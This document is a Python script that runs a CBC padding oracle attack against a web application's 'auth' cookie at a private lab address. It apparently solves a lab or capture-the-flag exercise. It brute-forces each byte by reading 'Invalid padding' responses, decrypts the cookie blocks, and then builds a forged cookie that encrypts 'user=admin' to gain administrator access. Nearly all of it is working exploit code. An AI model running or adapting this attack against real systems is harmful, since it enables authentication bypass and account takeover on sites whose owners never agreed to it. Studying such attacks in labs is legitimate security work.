import requests
from urllib.parse import quote,unquote
import base64
import codecs

import binascii
url = "http://10.0.0.131/index.php"
original_cookie = 'jPCx5yRQeMhdmKlRsHpp9P3j9ZTdwcvM'
plantext = []

def cookieToHex(cookValue):
    cookValue = unquote(cookValue) #urlDecode
    cookValue = base64.b64decode(cookValue)  #decode base64
    cookValue = cookValue.hex()  #convert to hex value
    return cookValue;

#from payload hex convert to cookie format
def buildCookie(cookValue):
    newcooke = base64.b64encode(cookValue) #convert hex to string and endcode to base64
    newcooke = quote(newcooke,safe='') # urlencode cookie
    return newcooke;

#Make new cookie and get each value of decrypted Cookie
def sendRequest(payload):
    cookie = dict(auth=payload)
    r = requests.get(url, cookies=cookie)
    if 'Invalid padding' in r.text:
        return True
    else:
        return False

# Main :

def getDecryptedBlock(original_block,i):

    # set tail of iv for each block be empty
    decrypted = []
    tailIv = b''
    # loop in 8 bytes of a block
    for j in range(1,9):
        #brute force 256 char for each padding
        for k in range(256):
            #generate iv : number zero byte + char at index payload + tail of iv
            newIv = b'0' * (8 - j) + bytes([k]) + tailIv
            payload = buildCookie(newIv+original_block[-1])
            result = sendRequest(payload)
            # if not invalid padding up to 1 for tail of pading, save decryted text into secret
            if not result:
                print ("true padding:" + str(k) +"-"+ str(newIv) +"-" +(cookieToHex(payload)))
                curDecryptChr = k^j
                decrypted.insert(0,curDecryptChr);
                plantext.append(chr(curDecryptChr^original_block[i][8-j]))
                temp = decrypted.copy()
                for u in range(len(temp)):
                    temp[u] = (j+1) ^ temp[u]
                tailIv = bytes(temp)
                continue
    # delete each last block after complete atack this block
    del original_block[-1]
    return decrypted

def makeAribilityCookie(valueExpect,randomcookie):
    newCookie = ''
    cookValue = cookieToHex(randomcookie);
    # split each 8 byte for each block
    blocks = [cookValue[i:i + 16] for i in range(0, len(cookValue), 16)]

    original_block = []
    exIndex = len(valueExpect) -1
    # save each decoded block to list
    for b in blocks:
        original_block.append(bytes.fromhex(b))
    newCookie = b'' + original_block[-1]

    for i in range(1,-1,-1):
        decrypt = getDecryptedBlock(original_block,i)
        temp = list(original_block[i])
        for j in range(len(decrypt)-1,-1,-1):
            temp[j] = ord(valueExpect[exIndex]) ^ decrypt[j]
            exIndex -= 1
        original_block[i] = bytes(temp)
        newCookie = original_block[i] + newCookie
    newCookie = buildCookie(newCookie)
    return newCookie
valueExpect = ['u', 's', 'e', 'r', '=', 'a', 'd', 'm', 'i', 'n', '\x06', '\x06', '\x06', '\x06', '\x06', '\x06']
expectedCookie = makeAribilityCookie(valueExpect,original_cookie)
print(expectedCookie)
